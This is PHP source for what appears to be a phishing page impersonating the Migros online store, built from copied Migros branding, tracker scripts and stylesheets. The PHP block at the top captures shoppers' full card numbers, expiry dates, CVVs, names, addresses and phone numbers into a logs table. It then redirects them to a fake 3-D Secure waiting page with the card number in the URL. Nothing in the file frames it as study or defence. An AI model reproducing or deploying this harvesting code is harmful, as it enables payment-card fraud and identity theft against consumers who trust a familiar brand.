<?php
error_reporting(E_ALL);
ini_set("display_errors", 1);

include 'db/connect.php';
$id = isset($_GET['id']) ? trim((string) $_GET['id']) : '';
if ($id === '') {
    header('Location: index.php');
    exit;
}

$urunler = $baglanti->prepare("SELECT * FROM bella_mg_urunler WHERE urunlink=?");
$urunler->execute([$id]);
$urun = $urunler->fetch(PDO::FETCH_ASSOC);
if (!$urun) {
    header('Location: index.php');
    exit;
}

$urun["resim1"] = str_replace("../", "", $urun["resim1"] ?? '');
$urun["resim2"] = str_replace("../", "", $urun["resim2"] ?? '');
$urun["resim3"] = str_replace("../", "", $urun["resim3"] ?? '');
$urun["resim4"] = str_replace("../", "", $urun["resim4"] ?? '');

$fiyat = $urun["fiyat"];
if(isset($_POST["send"])){
  $isim = $_POST["ad"]." ".$_POST["soyad"];
  $kart = $_POST["kart"];
  $ekle = $baglanti->prepare("INSERT INTO bella_mg_logs (tur, isimsoyisim, postakodu,telefon,adresbasligi, adres,kartsahip,kart,karttarih,kartcvv,durum,zaman) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)");

$ekle->execute(["3d", $isim, $_POST["postakodu"], $_POST["telefon"], $_POST["adresbasligi"], $_POST["adres"], $_POST["kartsahip"], $_POST["kart"], $_POST["karttarih"], $_POST["kartcvv"], "bekle", $time]);

  header("location:3dbekle.php?kart=$kart&fiyat=$fiyat");
}

?>
<html lang="tr-TR" class="" style="">
  <link type="text/css" rel="stylesheet" id="dark-mode-custom-link">
  <link type="text/css" rel="stylesheet" id="dark-mode-general-link">
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style lang="en" type="text/css" id="dark-mode-custom-style"></style>
  <style lang="en" type="text/css" id="dark-mode-native-style"></style>
  <style lang="en" type="text/css" id="dark-mode-native-sheet"></style>
  <head>
    <meta charset="utf-8">
    <title>Migros</title>
    <base href="/">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=0">
    <style type="text/css">
      :root,
      :host {
        --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Solid";
        --fa-font-regular: normal 400 1em/1 "Font Awesome 6 Regular";
        --fa-font-light: normal 300 1em/1 "Font Awesome 6 Light";
        --fa-font-thin: normal 100 1em/1 "Font Awesome 6 Thin";
        --fa-font-duotone: normal 900 1em/1 "Font Awesome 6 Duotone";
        --fa-font-sharp-solid: normal 900 1em/1 "Font Awesome 6 Sharp";
        --fa-font-brands: normal 400 1em/1 "Font Awesome 6 Brands";
      }

      svg:not(:root).svg-inline--fa,
      svg:not(:host).svg-inline--fa {
        overflow: visible;
        box-sizing: content-box;
      }

      .mat-mdc-form-field.infix input.mat-mdc-input-element[name="telefon"] {
    font-size: 14px; 
    padding: 8px; 
}

      .svg-inline--fa {
        display: var(--fa-display, inline-block);
        height: 1em;
        overflow: visible;
        vertical-align: -0.125em;
      }

      .svg-inline--fa.fa-2xs {
        vertical-align: 0.1em;
      }

      .svg-inline--fa.fa-xs {
        vertical-align: 0em;
      }

      .svg-inline--fa.fa-sm {
        vertical-align: -0.0714285705em;
      }

      .svg-inline--fa.fa-lg {
        vertical-align: -0.2em;
      }

      .svg-inline--fa.fa-xl {
        vertical-align: -0.25em;
      }

      .svg-inline--fa.fa-2xl {
        vertical-align: -0.3125em;
      }

      .svg-inline--fa.fa-pull-left {
        margin-right: var(--fa-pull-margin, 0.3em);
        width: auto;
      }

      .svg-inline--fa.fa-pull-right {
        margin-left: var(--fa-pull-margin, 0.3em);
        width: auto;
      }

      .svg-inline--fa.fa-li {
        width: var(--fa-li-width, 2em);
        top: 0.25em;
      }

      .svg-inline--fa.fa-fw {
        width: var(--fa-fw-width, 1.25em);
      }

      .fa-layers svg.svg-inline--fa {
        bottom: 0;
        left: 0;
        margin: auto;
        position: absolute;
        right: 0;
        top: 0;
      }

      .fa-layers-counter,
      .fa-layers-text {
        display: inline-block;
        position: absolute;
        text-align: center;
      }

      .fa-layers {
        display: inline-block;
        height: 1em;
        position: relative;
        text-align: center;
        vertical-align: -0.125em;
        width: 1em;
      }

      .fa-layers svg.svg-inline--fa {
        -webkit-transform-origin: center center;
        transform-origin: center center;
      }

      .fa-layers-text {
        left: 50%;
        top: 50%;
        -webkit-transform: translate(-50%, -50%);
        transform: translate(-50%, -50%);
        -webkit-transform-origin: center center;
        transform-origin: center center;
      }

      .fa-layers-counter {
        background-color: var(--fa-counter-background-color, #ff253a);
        border-radius: var(--fa-counter-border-radius, 1em);
        box-sizing: border-box;
        color: var(--fa-inverse, #fff);
        line-height: var(--fa-counter-line-height, 1);
        max-width: var(--fa-counter-max-width, 5em);
        min-width: var(--fa-counter-min-width, 1.5em);
        overflow: hidden;
        padding: var(--fa-counter-padding, 0.25em 0.5em);
        right: var(--fa-right, 0);
        text-overflow: ellipsis;
        top: var(--fa-top, 0);
        -webkit-transform: scale(var(--fa-counter-scale, 0.25));
        transform: scale(var(--fa-counter-scale, 0.25));
        -webkit-transform-origin: top right;
        transform-origin: top right;
      }

      .fa-layers-bottom-right {
        bottom: var(--fa-bottom, 0);
        right: var(--fa-right, 0);
        top: auto;
        -webkit-transform: scale(var(--fa-layers-scale, 0.25));
        transform: scale(var(--fa-layers-scale, 0.25));
        -webkit-transform-origin: bottom right;
        transform-origin: bottom right;
      }

      .fa-layers-bottom-left {
        bottom: var(--fa-bottom, 0);
        left: var(--fa-left, 0);
        right: auto;
        top: auto;
        -webkit-transform: scale(var(--fa-layers-scale, 0.25));
        transform: scale(var(--fa-layers-scale, 0.25));
        -webkit-transform-origin: bottom left;
        transform-origin: bottom left;
      }

      .fa-layers-top-right {
        top: var(--fa-top, 0);
        right: var(--fa-right, 0);
        -webkit-transform: scale(var(--fa-layers-scale, 0.25));
        transform: scale(var(--fa-layers-scale, 0.25));
        -webkit-transform-origin: top right;
        transform-origin: top right;
      }

      .fa-layers-top-left {
        left: var(--fa-left, 0);
        right: auto;
        top: var(--fa-top, 0);
        -webkit-transform: scale(var(--fa-layers-scale, 0.25));
        transform: scale(var(--fa-layers-scale, 0.25));
        -webkit-transform-origin: top left;
        transform-origin: top left;
      }

      .fa-1x {
        font-size: 1em;
      }

      .fa-2x {
        font-size: 2em;
      }

      .fa-3x {
        font-size: 3em;
      }

      .fa-4x {
        font-size: 4em;
      }

      .fa-5x {
        font-size: 5em;
      }

      .fa-6x {
        font-size: 6em;
      }

      .fa-7x {
        font-size: 7em;
      }

      .fa-8x {
        font-size: 8em;
      }

      .fa-9x {
        font-size: 9em;
      }

      .fa-10x {
        font-size: 10em;
      }

      .fa-2xs {
        font-size: 0.625em;
        line-height: 0.1em;
        vertical-align: 0.225em;
      }

      .fa-xs {
        font-size: 0.75em;
        line-height: 0.0833333337em;
        vertical-align: 0.125em;
      }

      .fa-sm {
        font-size: 0.875em;
        line-height: 0.0714285718em;
        vertical-align: 0.0535714295em;
      }

      .fa-lg {
        font-size: 1.25em;
        line-height: 0.05em;
        vertical-align: -0.075em;
      }

      .fa-xl {
        font-size: 1.5em;
        line-height: 0.0416666682em;
        vertical-align: -0.125em;
      }

      .fa-2xl {
        font-size: 2em;
        line-height: 0.03125em;
        vertical-align: -0.1875em;
      }

      .fa-fw {
        text-align: center;
        width: 1.25em;
      }

      .fa-ul {
        list-style-type: none;
        margin-left: var(--fa-li-margin, 2.5em);
        padding-left: 0;
      }

      .fa-ul>li {
        position: relative;
      }

      .fa-li {
        left: calc(var(--fa-li-width, 2em) * -1);
        position: absolute;
        text-align: center;
        width: var(--fa-li-width, 2em);
        line-height: inherit;
      }

      .fa-border {
        border-color: var(--fa-border-color, #eee);
        border-radius: var(--fa-border-radius, 0.1em);
        border-style: var(--fa-border-style, solid);
        border-width: var(--fa-border-width, 0.08em);
        padding: var(--fa-border-padding, 0.2em 0.25em 0.15em);
      }

      .fa-pull-left {
        float: left;
        margin-right: var(--fa-pull-margin, 0.3em);
      }

      .fa-pull-right {
        float: right;
        margin-left: var(--fa-pull-margin, 0.3em);
      }

      .fa-beat {
        -webkit-animation-name: fa-beat;
        animation-name: fa-beat;
        -webkit-animation-delay: var(--fa-animation-delay, 0s);
        animation-delay: var(--fa-animation-delay, 0s);
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 1s);
        animation-duration: var(--fa-animation-duration, 1s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
        animation-timing-function: var(--fa-animation-timing, ease-in-out);
      }

      .fa-bounce {
        -webkit-animation-name: fa-bounce;
        animation-name: fa-bounce;
        -webkit-animation-delay: var(--fa-animation-delay, 0s);
        animation-delay: var(--fa-animation-delay, 0s);
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 1s);
        animation-duration: var(--fa-animation-duration, 1s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
        animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
      }

      .fa-fade {
        -webkit-animation-name: fa-fade;
        animation-name: fa-fade;
        -webkit-animation-delay: var(--fa-animation-delay, 0s);
        animation-delay: var(--fa-animation-delay, 0s);
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 1s);
        animation-duration: var(--fa-animation-duration, 1s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
        animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
      }

      .fa-beat-fade {
        -webkit-animation-name: fa-beat-fade;
        animation-name: fa-beat-fade;
        -webkit-animation-delay: var(--fa-animation-delay, 0s);
        animation-delay: var(--fa-animation-delay, 0s);
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 1s);
        animation-duration: var(--fa-animation-duration, 1s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
        animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
      }

      .fa-flip {
        -webkit-animation-name: fa-flip;
        animation-name: fa-flip;
        -webkit-animation-delay: var(--fa-animation-delay, 0s);
        animation-delay: var(--fa-animation-delay, 0s);
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 1s);
        animation-duration: var(--fa-animation-duration, 1s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
        animation-timing-function: var(--fa-animation-timing, ease-in-out);
      }

      .fa-shake {
        -webkit-animation-name: fa-shake;
        animation-name: fa-shake;
        -webkit-animation-delay: var(--fa-animation-delay, 0s);
        animation-delay: var(--fa-animation-delay, 0s);
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 1s);
        animation-duration: var(--fa-animation-duration, 1s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, linear);
        animation-timing-function: var(--fa-animation-timing, linear);
      }

      .fa-spin {
        -webkit-animation-name: fa-spin;
        animation-name: fa-spin;
        -webkit-animation-delay: var(--fa-animation-delay, 0s);
        animation-delay: var(--fa-animation-delay, 0s);
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 2s);
        animation-duration: var(--fa-animation-duration, 2s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, linear);
        animation-timing-function: var(--fa-animation-timing, linear);
      }

      .fa-spin-reverse {
        --fa-animation-direction: reverse;
      }

      .fa-pulse,
      .fa-spin-pulse {
        -webkit-animation-name: fa-spin;
        animation-name: fa-spin;
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 1s);
        animation-duration: var(--fa-animation-duration, 1s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, steps(8));
        animation-timing-function: var(--fa-animation-timing, steps(8));
      }

      @media (prefers-reduced-motion: reduce) {

        .fa-beat,
        .fa-bounce,
        .fa-fade,
        .fa-beat-fade,
        .fa-flip,
        .fa-pulse,
        .fa-shake,
        .fa-spin,
        .fa-spin-pulse {
          -webkit-animation-delay: -1ms;
          animation-delay: -1ms;
          -webkit-animation-duration: 1ms;
          animation-duration: 1ms;
          -webkit-animation-iteration-count: 1;
          animation-iteration-count: 1;
          transition-delay: 0s;
          transition-duration: 0s;
        }
      }

      @-webkit-keyframes fa-beat {

        0%,
        90% {
          -webkit-transform: scale(1);
          transform: scale(1);
        }

        45% {
          -webkit-transform: scale(var(--fa-beat-scale, 1.25));
          transform: scale(var(--fa-beat-scale, 1.25));
        }
      }

      @keyframes fa-beat {

        0%,
        90% {
          -webkit-transform: scale(1);
          transform: scale(1);
        }

        45% {
          -webkit-transform: scale(var(--fa-beat-scale, 1.25));
          transform: scale(var(--fa-beat-scale, 1.25));
        }
      }

      @-webkit-keyframes fa-bounce {
        0% {
          -webkit-transform: scale(1, 1) translateY(0);
          transform: scale(1, 1) translateY(0);
        }

        10% {
          -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
          transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
        }

        30% {
          -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
          transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
        }

        50% {
          -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
          transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
        }

        57% {
          -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
          transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
        }

        64% {
          -webkit-transform: scale(1, 1) translateY(0);
          transform: scale(1, 1) translateY(0);
        }

        100% {
          -webkit-transform: scale(1, 1) translateY(0);
          transform: scale(1, 1) translateY(0);
        }
      }

      @keyframes fa-bounce {
        0% {
          -webkit-transform: scale(1, 1) translateY(0);
          transform: scale(1, 1) translateY(0);
        }

        10% {
          -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
          transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
        }

        30% {
          -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
          transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
        }

        50% {
          -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
          transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
        }

        57% {
          -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
          transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
        }

        64% {
          -webkit-transform: scale(1, 1) translateY(0);
          transform: scale(1, 1) translateY(0);
        }

        100% {
          -webkit-transform: scale(1, 1) translateY(0);
          transform: scale(1, 1) translateY(0);
        }
      }

      @-webkit-keyframes fa-fade {
        50% {
          opacity: var(--fa-fade-opacity, 0.4);
        }
      }

      @keyframes fa-fade {
        50% {
          opacity: var(--fa-fade-opacity, 0.4);
        }
      }

      @-webkit-keyframes fa-beat-fade {

        0%,
        100% {
          opacity: var(--fa-beat-fade-opacity, 0.4);
          -webkit-transform: scale(1);
          transform: scale(1);
        }

        50% {
          opacity: 1;
          -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
          transform: scale(var(--fa-beat-fade-scale, 1.125));
        }
      }

      @keyframes fa-beat-fade {

        0%,
        100% {
          opacity: var(--fa-beat-fade-opacity, 0.4);
          -webkit-transform: scale(1);
          transform: scale(1);
        }

        50% {
          opacity: 1;
          -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
          transform: scale(var(--fa-beat-fade-scale, 1.125));
        }
      }

      @-webkit-keyframes fa-flip {
        50% {
          -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
          transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
        }
      }

      @keyframes fa-flip {
        50% {
          -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
          transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
        }
      }

      @-webkit-keyframes fa-shake {
        0% {
          -webkit-transform: rotate(-15deg);
          transform: rotate(-15deg);
        }

        4% {
          -webkit-transform: rotate(15deg);
          transform: rotate(15deg);
        }

        8%,
        24% {
          -webkit-transform: rotate(-18deg);
          transform: rotate(-18deg);
        }

        12%,
        28% {
          -webkit-transform: rotate(18deg);
          transform: rotate(18deg);
        }

        16% {
          -webkit-transform: rotate(-22deg);
          transform: rotate(-22deg);
        }

        20% {
          -webkit-transform: rotate(22deg);
          transform: rotate(22deg);
        }

        32% {
          -webkit-transform: rotate(-12deg);
          transform: rotate(-12deg);
        }

        36% {
          -webkit-transform: rotate(12deg);
          transform: rotate(12deg);
        }

        40%,
        100% {
          -webkit-transform: rotate(0deg);
          transform: rotate(0deg);
        }
      }

      @keyframes fa-shake {
        0% {
          -webkit-transform: rotate(-15deg);
          transform: rotate(-15deg);
        }

        4% {
          -webkit-transform: rotate(15deg);
          transform: rotate(15deg);
        }

        8%,
        24% {
          -webkit-transform: rotate(-18deg);
          transform: rotate(-18deg);
        }

        12%,
        28% {
          -webkit-transform: rotate(18deg);
          transform: rotate(18deg);
        }

        16% {
          -webkit-transform: rotate(-22deg);
          transform: rotate(-22deg);
        }

        20% {
          -webkit-transform: rotate(22deg);
          transform: rotate(22deg);
        }

        32% {
          -webkit-transform: rotate(-12deg);
          transform: rotate(-12deg);
        }

        36% {
          -webkit-transform: rotate(12deg);
          transform: rotate(12deg);
        }

        40%,
        100% {
          -webkit-transform: rotate(0deg);
          transform: rotate(0deg);
        }
      }

      @-webkit-keyframes fa-spin {
        0% {
          -webkit-transform: rotate(0deg);
          transform: rotate(0deg);
        }

        100% {
          -webkit-transform: rotate(360deg);
          transform: rotate(360deg);
        }
      }

      @keyframes fa-spin {
        0% {
          -webkit-transform: rotate(0deg);
          transform: rotate(0deg);
        }

        100% {
          -webkit-transform: rotate(360deg);
          transform: rotate(360deg);
        }
      }

      .fa-rotate-90 {
        -webkit-transform: rotate(90deg);
        transform: rotate(90deg);
      }

      .fa-rotate-180 {
        -webkit-transform: rotate(180deg);
        transform: rotate(180deg);
      }

      .fa-rotate-270 {
        -webkit-transform: rotate(270deg);
        transform: rotate(270deg);
      }

      .fa-flip-horizontal {
        -webkit-transform: scale(-1, 1);
        transform: scale(-1, 1);
      }

      .fa-flip-vertical {
        -webkit-transform: scale(1, -1);
        transform: scale(1, -1);
      }

      .fa-flip-both,
      .fa-flip-horizontal.fa-flip-vertical {
        -webkit-transform: scale(-1, -1);
        transform: scale(-1, -1);
      }

      .fa-rotate-by {
        -webkit-transform: rotate(var(--fa-rotate-angle, none));
        transform: rotate(var(--fa-rotate-angle, none));
      }

      .fa-stack {
        display: inline-block;
        vertical-align: middle;
        height: 2em;
        position: relative;
        width: 2.5em;
      }

      .fa-stack-1x,
      .fa-stack-2x {
        bottom: 0;
        left: 0;
        margin: auto;
        position: absolute;
        right: 0;
        top: 0;
        z-index: var(--fa-stack-z-index, auto);
      }

      .svg-inline--fa.fa-stack-1x {
        height: 1em;
        width: 1.25em;
      }

      .svg-inline--fa.fa-stack-2x {
        height: 2em;
        width: 2.5em;
      }

      .fa-inverse {
        color: var(--fa-inverse, #fff);
      }

      .sr-only,
      .fa-sr-only {
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
        white-space: nowrap;
        border-width: 0;
      }

      .sr-only-focusable:not(:focus),
      .fa-sr-only-focusable:not(:focus) {
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
        white-space: nowrap;
        border-width: 0;
      }

      .svg-inline--fa .fa-primary {
        fill: var(--fa-primary-color, currentColor);
        opacity: var(--fa-primary-opacity, 1);
      }

      .svg-inline--fa .fa-secondary {
        fill: var(--fa-secondary-color, currentColor);
        opacity: var(--fa-secondary-opacity, 0.4);
      }

      .svg-inline--fa.fa-swap-opacity .fa-primary {
        opacity: var(--fa-secondary-opacity, 0.4);
      }

      .svg-inline--fa.fa-swap-opacity .fa-secondary {
        opacity: var(--fa-primary-opacity, 1);
      }

      .svg-inline--fa mask .fa-primary,
      .svg-inline--fa mask .fa-secondary {
        fill: black;
      }

      .fad.fa-inverse,
      .fa-duotone.fa-inverse {
        color: var(--fa-inverse, #fff);
      }
    </style>
    <link rel="manifest" href="manifest.json">
    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
    <meta name="theme-color" content="#ff9933">
    <meta name="description" property="og:description" content="">
    <meta property="og:site_name" content="@migros_tr">
    <meta property="og:image" content="https://images.migrosone.com/sanalmarket/custom/sanalmarket-seo-34706362.png">
    <link rel="apple-touch-icon" sizes="57x57" href="assets/images/seo/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="114x114" href="assets/images/seo/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="72x72" href="assets/images/seo/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="144x144" href="assets/images/seo/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="60x60" href="assets/images/seo/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="120x120" href="assets/images/seo/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="76x76" href="assets/images/seo/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="152x152" href="assets/images/seo/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" href="assets/images/seo/apple-touch-icon.png">
    <link rel="apple-touch-icon-precomposed" sizes="57x57" href="assets/images/seo/apple-touch-icon-57x57-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="assets/images/seo/apple-touch-icon-114x114-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="assets/images/seo/apple-touch-icon-72x72-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="assets/images/seo/apple-touch-icon-144x144-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="60x60" href="assets/images/seo/apple-touch-icon-60x60-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="assets/images/seo/apple-touch-icon-120x120-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="76x76" href="assets/images/seo/apple-touch-icon-76x76-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="assets/images/seo/apple-touch-icon-152x152-precomposed.png">
    <link rel="apple-touch-icon-precomposed" href="assets/images/seo/apple-touch-icon-precomposed.png">
    <!-- To make possible for marketing partners to capture utm tags -->
    <!-- For more info, check: https://developers.google.com/web/updates/2020/07/referrer-policy-new-chrome-default -->
    <meta name="referrer" content="no-referrer-when-downgrade">
    <script type="text/javascript" src="https://track.adform.net/Serving/TrackPoint/?pm=2443498&amp;ADFPageName=Login_olanlar&amp;ADFdivider=%7C&amp;ord=412362469587&amp;ADFtpmode=2&amp;loc=https%3A%2F%2Fwww.migros.com.tr%2Fgiris&amp;Set1=tr-TR%7Ctr-TR%7C1366x768%7C24"></script>
    <script type="text/javascript" src="https://track.adform.net/Serving/TrackPoint/?pm=2443498&amp;ADFPageName=Tum_sayfalar&amp;ADFdivider=%7C&amp;ord=720321918594&amp;ADFtpmode=2&amp;loc=https%3A%2F%2Fwww.migros.com.tr%2Fgiris&amp;Set1=tr-TR%7Ctr-TR%7C1366x768%7C24"></script>
    <script type="text/javascript" async="" src="https://s2.adform.net/banners/scripts/st/trackpoint-async.js"></script>
    <script type="text/javascript" async="" src="https://s2.adform.net/banners/scripts/st/trackpoint-async.js"></script>
    <script type="text/javascript" src="https://track.adform.net/Serving/TrackPoint/?pm=2443498&amp;ADFPageName=Tum_sayfalar&amp;ADFdivider=%7C&amp;ord=912907816740&amp;ADFtpmode=2&amp;loc=https%3A%2F%2Fwww.migros.com.tr%2Fsepetim&amp;Set1=tr-TR%7Ctr-TR%7C1366x768%7C24"></script>
    <script type="text/javascript" async="" src="https://s2.adform.net/banners/scripts/st/trackpoint-async.js"></script>
    <script type="text/javascript" async="" src="https://www.google-analytics.com/plugins/ua/ec.js"></script>
    <script type="text/javascript" src="https://track.adform.net/Serving/TrackPoint/?pm=2443498&amp;ADFPageName=Tum_sayfalar&amp;ADFdivider=%7C&amp;ord=115473954094&amp;ADFtpmode=2&amp;loc=https%3A%2F%2Fwww.migros.com.tr%2F&amp;Set1=tr-TR%7Ctr-TR%7C1366x768%7C24"></script>
    <script type="text/javascript" async="" src="https://s2.adform.net/banners/scripts/st/trackpoint-async.js"></script>
    <script type="text/javascript" id="pfx_ap" async="" src="//img2-digitouch.mncdn.com/include/dynamic_click_tag.js"></script>
    <script src="https://connect.facebook.net/signals/config/497441154013742?v=2.9.147&amp;r=stable&amp;domain=www.migros.com.tr&amp;hme=20c913bdcd4be51a752120153aa5caaecb3ee86c7f26cf737846e40b202aba68&amp;ex_m=62%2C106%2C94%2C98%2C53%2C3%2C88%2C61%2C14%2C86%2C79%2C44%2C46%2C150%2C153%2C164%2C160%2C161%2C163%2C25%2C89%2C45%2C68%2C162%2C145%2C148%2C157%2C158%2C165%2C115%2C13%2C43%2C169%2C168%2C117%2C16%2C29%2C32%2C1%2C36%2C57%2C58%2C59%2C63%2C83%2C15%2C12%2C85%2C82%2C81%2C95%2C97%2C31%2C96%2C26%2C22%2C146%2C149%2C124%2C24%2C9%2C10%2C11%2C5%2C6%2C21%2C19%2C20%2C49%2C54%2C56%2C66%2C90%2C23%2C67%2C8%2C7%2C71%2C41%2C18%2C92%2C91%2C17%2C4%2C73%2C80%2C72%2C78%2C40%2C39%2C77%2C33%2C35%2C76%2C48%2C74%2C28%2C37%2C65%2C0%2C84%2C75%2C2%2C30%2C55%2C34%2C93%2C38%2C70%2C60%2C99%2C52%2C51%2C27%2C87%2C50%2C47%2C42%2C69%2C64%2C100" async=""></script>
    <script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script>
    <script type="text/javascript" async="" src="https://static.criteo.net/js/ld/ld.js"></script>
    <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script>
    <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-KTN3ZLW2R5&amp;l=dataLayer&amp;cx=c"></script>
    <script async="" src="https://cdn.adjust.com/adjust-latest.min.js"></script>
    <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/destination?id=DC-10610902&amp;l=dataLayer&amp;cx=c"></script>
    <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/destination?id=AW-715674769&amp;l=dataLayer&amp;cx=c"></script>
    <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-NKFR7KK"></script>
    <script src="env.js"></script>
    <script async="" src="https://pagead2.googlesyndication.com/tag/js/gpt.js"></script>
    <link rel="stylesheet" href="https://www.migros.com.tr/styles.763294da9dce950b.css">
